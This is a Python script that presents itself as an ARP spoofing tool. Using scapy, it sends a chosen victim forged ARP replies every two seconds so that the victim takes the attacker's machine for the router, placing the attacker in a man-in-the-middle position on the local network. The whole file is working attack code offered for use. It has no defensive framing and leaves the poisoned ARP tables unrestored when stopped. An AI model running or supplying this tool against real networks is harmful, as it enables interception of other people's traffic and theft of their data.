import argparse
import scapy.all as scapy
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify Victim IP address", required=True)
    parser.add_argument("-r", "--router", dest="router_ip", help="Specify Router IP address", required=True)
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = arp_broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"Could not find MAC address for {ip}")
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        return

    my_mac = scapy.get_if_hwaddr("eth0")
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    scapy.send(arp_response, verbose=True)

def main():
    options = get_arguments()
    spoof_ip = options.router_ip
    target_ip = options.target_ip

    try:
        while True:
            time.sleep(2)
            spoof(target_ip, spoof_ip)
            print(f"ARP spoofing packet sent to {target_ip} pretending to be {spoof_ip}")
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")

if __name__ == "__main__":
    main()
